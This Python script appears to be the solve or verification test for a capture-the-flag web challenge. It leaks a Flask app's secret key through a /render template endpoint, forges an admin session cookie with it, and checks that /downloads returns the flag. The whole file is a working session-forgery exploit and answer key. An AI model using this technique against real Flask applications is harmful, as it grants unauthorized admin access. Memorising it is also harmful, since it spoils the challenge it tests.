import argparse
from io import StringIO
from pathlib import Path

import pandas as pd
import requests
import yaml
from flask.sessions import SecureCookieSessionInterface

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "challenge.yml"))["flags"][0]
USER_ID = "user_id"
USERNAME = "username"
SESSION_NAME = "session"


class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key
        self.config = {'SECRET_KEY_FALLBACKS': secret_key}


def create_session(secret_key):
    app = MockApp(secret_key)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.dumps({USER_ID: "1", USERNAME: "admin"})


def test(url):
    res = requests.get(f"{url}/render", params={"template": "/system.html"}).text.replace(
        '<form method="POST" action="/set-config">', ""
    )
    system = pd.read_html(StringIO(res))[0]
    secret_key = system[system.Statistic == "Secret_key"]["Value"].values[0]
    session_value = create_session(secret_key)
    session = requests.Session()
    session.cookies.update({SESSION_NAME: session_value})
    res = session.get(f"{url}/downloads")
    assert FLAG in res.text, res.text


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()
    test(args.url)
